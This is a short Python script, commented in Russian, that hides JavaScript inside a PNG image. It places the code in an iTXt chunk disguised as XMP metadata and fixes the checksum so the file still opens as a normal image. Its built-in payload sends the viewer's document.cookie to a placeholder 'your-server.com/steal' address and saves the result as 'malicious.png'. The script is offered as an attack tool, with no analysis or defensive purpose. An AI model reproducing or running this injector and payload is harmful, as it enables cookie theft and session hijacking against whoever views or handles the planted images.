#!/usr/bin/env python3
import struct, zlib, sys

def png_inject(image_path, output_path, js_code):
    with open(image_path, 'rb') as f:
        data = bytearray(f.read())
    
    # Проверка сигнатуры PNG
    if data[:8] != b'\x89PNG\r\n\x1a\n':
        raise ValueError("Не PNG файл")
    
    # Создаем iTXt chunk (UTF-8, сжатый)
    keyword = b"XML:com.adobe.xmp"
    text_data = f'<x:xmpmeta><rdf:Description rdf:about=""><script>{js_code}</script></rdf:Description></x:xmpmeta>'.encode('utf-8')
    
    chunk_data = keyword + b'\x00\x00\x00\x00' + text_data
    chunk_len = struct.pack('>I', len(chunk_data))
    chunk_type = b'iTXt'
    crc = struct.pack('>I', zlib.crc32(chunk_type + chunk_data) & 0xffffffff)
    
    new_chunk = chunk_len + chunk_type + chunk_data + crc
    
    # Вставка после IHDR
    ihdr_end = 8 + 8 + struct.unpack('>I', data[8:12])[0]
    pos = ihdr_end + 4
    data[pos:pos] = new_chunk
    
    with open(output_path, 'wb') as f:
        f.write(data)
    
    print(f"[+] JS внедрен в {output_path}")

if __name__ == "__main__":
    js = "alert('Malicious PNG'); fetch('https://your-server.com/steal?cookie='+document.cookie)"
    png_inject("clean.png", "malicious.png", js)